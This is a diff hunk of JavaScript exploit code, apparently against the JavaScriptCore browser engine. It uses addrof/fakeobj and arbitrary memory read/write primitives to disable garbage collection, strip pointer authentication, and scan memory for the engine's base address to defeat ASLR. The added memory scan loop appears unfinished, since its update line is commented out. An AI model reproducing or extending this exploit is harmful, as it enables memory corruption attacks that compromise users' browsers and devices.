@@ -235,7 +235,38 @@ function buildDSScribblePrimitives(addrof, fakeobj) {
             // both offsets from the candidate backing store.
             proofView.setBigUint64(0x00, markerA, true);
             proofView.setBigUint64(0x40, markerB, true);
+            //DISABLE GC
+            ///DISABLE WORKLET GC
+            const vm = read64(read64(addrof(globalThis).add(0x10n)).add(0x38n));
+            log("vm:" + read64(read64(addrof(globalThis).add(0x10n)).add(0x38n)));
+            const heap = vm.add(0xc0n);
+            log("heap:" + heap);
+            const isSafeToCollect = heap.add(0x241n);
+            function write8(ptr, u16) {
+                    let value = read64(ptr);
+                    value &= ~0xffn;
+                    value |= u16;
+                    write64(ptr, value);
+                };
+            write8(isSafeToCollect, 0n);
+            log("GC disabled", "ok");
+            log("Fetching JSC_base")
+            const executable = read64(addrof(parseFloat) + 0x18n);
+                    globalFuncParseFloat = read64(executable + 0x28n).noPAC();
+                    const jsc_base = (function () {
+                        let jsc_base = globalFuncParseFloat & ~0xfffn;
 
+                        while (1) {
+                           //todo fix by adding the biguint64arr back 
+                            // read64_biguint64arr[1] = jsc_base;
+                            if (read64_str.charCodeAt(0) == 0xfacf && read64_str.charCodeAt(1) == 0xfeed) {
+                                return jsc_base;
+                            }
+                            jsc_base -= 0x1000n;
+                        }
+                    })();
+                    log("jsc_base: " + jsc_base.hex());
+            //END 
             const vectorRaw = read64(addrof(proofU8) + 0x10n);
             if (label === "primary") report.vectorRaw = vectorRaw;
 
